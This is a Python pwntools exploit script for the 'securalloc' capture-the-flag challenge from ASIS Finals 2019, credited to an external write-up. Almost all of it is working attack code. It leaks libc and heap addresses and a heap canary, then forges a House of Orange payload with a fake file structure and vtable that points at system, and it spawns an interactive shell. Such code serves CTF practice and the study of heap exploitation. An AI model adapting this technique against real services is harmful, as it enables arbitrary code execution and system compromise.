#
# Credits to TeamRocketIST
# https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/
#

from pwn import *
host, port = "localhost", "9876"
filename = "./securalloc.elf"
elf = ELF(filename)
context.arch = 'amd64'

libc = ELF('./libc.so.6')

def getConn():
    return remote(host, port)

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def get_LIBC(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[4].split("-")[0],16)

def get_LIBALLOC(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[9].split("-")[0],16)

def debug(bp, labp=[]):
    script = ""
    PIE = get_PIE(r)
    LIBALLOC = get_LIBALLOC(r)
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    for x in labp:
        script += "b *0x%x\n"%(LIBALLOC+x)
    gdb.attach(r,gdbscript=script)

def add(size):
    r.sendlineafter('==========\n> ', '1')
    r.sendlineafter('Size: ', str(size))


def edit(data):
    r.sendlineafter('==========\n> ', '2')
    r.sendlineafter('Data: ', data)

def show():
    r.sendlineafter('==========\n> ', '3')


def delete():
    r.sendlineafter('==========\n> ', '4')


context.terminal = ['tmux', 'new-window']


def exploit():
    try:
        global r
        r = getConn()
        
        # leak libc and heap (_IO_2_1_stderr)
        add(0x60)
        delete()
        add(0x30)

        show()
        r.recvuntil('Data: ')
        HEAPADDR = u64(r.recv(6).ljust(0x8,'\x00'))
        HEAP = HEAPADDR - 0xf0
        log.info("HEAPADDR 0x%x" % HEAPADDR)
        log.info("HEAP 0x%x" % HEAP)

        
        add(0x10)
        show()
        r.recvuntil('Data: ')
        IOFILEJUMPS = u64(r.recv(6).ljust(0x8,'\x00')) # _IO_file_jumps

        LIBC = IOFILEJUMPS - libc.symbols['_IO_file_jumps']
        _IO_LIST_ALL = LIBC + libc.symbols['_IO_list_all']
        SYSTEM = LIBC + libc.symbols['system']
        log.info("IO_file_jumps 0x%x" % IOFILEJUMPS)
        log.info("LIBC 0x%x" % LIBC)
        
        # leak heap canary (/dev/urandom buffer)
        add(0x140)
        add(0x8)
        show()
        HEAPCANARY = u64(r.recvline().rstrip()[-7::].rjust(0x8,'\x00'))
        log.info("HEAPCANARY 0x%x" % HEAPCANARY)

        # 3) HOUSE OF ORANGE
        
        add(0x3e0) # fastbin(0x80) goes to a smallbin because allocation is > 1000 (0x3e0+0x10 = 1008)
        payload = p64(HEAPCANARY)
        payload += "/bin/sh\x00"
        payload += p64(0x61) #size
        payload += p64(0xdeadbeef) # FD
        payload += p64(_IO_LIST_ALL-0x10) # BK
        payload += p64(0) + p64(1) #_IO_write_base < _IO_write_ptr
        payload += p64(0) * 18 # unused
        payload += p64(0) # fp->_mode <= 0
        payload += p64(0) * 2 # unused
        payload += p64(HEAP+0x100) # VTABLE ADDRESS
        payload += p64(0) * 3 #VTABLE
        payload += p64(SYSTEM)
        add(0x0)
        edit(payload)
        add(0x10)
        r.recvuntil('[vdso]\n')
        r.sendline('ls -ltah') # send ls command
        r.recvline_regex(r'\d\d:\d\d\s\.') # to check if ls ran succefully
        r.interactive()
        r.close()
        return True
    except EOFError, KeyboardInterrupt:
        r.close()
        return False
while not exploit():
    pass
